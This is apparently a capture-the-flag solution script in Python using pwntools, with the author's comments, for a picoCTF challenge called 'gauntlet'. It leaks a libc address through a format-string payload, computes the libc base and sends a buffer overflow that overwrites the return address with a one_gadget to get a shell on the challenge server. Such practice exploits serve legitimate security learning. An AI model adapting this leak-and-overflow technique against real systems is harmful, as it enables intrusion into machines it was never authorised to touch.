from pwn import *

r = remote("wily-courier.picoctf.net" , 58634)

library = "/mnt/c/Users/PC/Downloads/libc-2.27.so"
# it use 2.27 but if i execute it on my machine , i cannot use 2.27 interpreter and libc
binary = "/mnt/c/Users/PC/Downloads/gauntlet"

# r = process(binary)

libc = ELF(library)
elf = ELF(binary)

context.arch = elf.arch
context.log_level = "debug"
context.binary = binary


payload1 = b"%p|"*30
r.sendline(payload1)
stack = r.recvline().strip().split(b"|")
leak = int(stack[22] , 16)
# leak the one of libc address , can use gdb to look which libc is this

base = leak - (libc.symbols["__libc_start_main"]+231)
# use leak address to get libc_base
# 231 is that address is because <__libc_start_main>+231
# you can look libc.symbols["__libc_start_main"] this address and connect the server to input %23$p to leak this address 

# use this leak address' last three digits (0xaaabbbccc , use 0xccc) to minus libc.symbols["__libc_start_main"] last three digits
# you can search this if you dont know 

one_gadget = base + 0x4f302
# sudo apt install ruby-full
# sudo gem install one_gadget 
# we use "one_gadget ./libc-2.27.so" to get one_gadget address (0x4f302)

offset = 120
# like previous challenge 

payload = b"\x90"*offset + p64(one_gadget)

r.sendline(payload)

r.interactive()
